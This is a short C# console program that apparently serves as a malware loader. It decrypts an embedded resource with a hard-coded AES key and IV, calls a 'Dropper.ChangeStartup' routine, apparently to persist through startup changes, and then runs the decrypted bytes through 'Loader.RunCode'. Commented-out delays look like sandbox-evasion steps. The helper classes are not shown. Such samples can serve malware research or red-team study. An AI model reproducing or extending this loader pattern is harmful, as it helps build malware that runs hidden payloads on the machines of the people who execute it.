using System.Security.Cryptography;
using System.Text;

namespace ConsoleApp
{
    internal class Program
    {

        static void Main(string[] args)
        {
            //Console.WriteLine("1. Waiting 5 seconds before decrypting");
            //System.Threading.Thread.Sleep(5000);
            //Console.WriteLine("done.");

            Console.WriteLine("2. Decrypting resource");
            Aes jar = Aes.Create();
            jar.Key = Encoding.ASCII.GetBytes("kyungjle01234567");
            jar.IV = Encoding.ASCII.GetBytes("01234567kyungjle");
            byte[] data = jar.DecryptCbc(
                Resource1.a,
                jar.IV
            );
            Console.WriteLine("done.");

            //Console.WriteLine("3. Waiting 5 seconds after decrypting");
            //System.Threading.Thread.Sleep(5000);
            //Console.WriteLine("done.");

            Console.WriteLine("4. Dropping");
            Dropper.ChangeStartup();
            Console.WriteLine("done.");

            Console.WriteLine("5. Invoking platform code");
            Loader.RunCode(data);
        }

    }

}
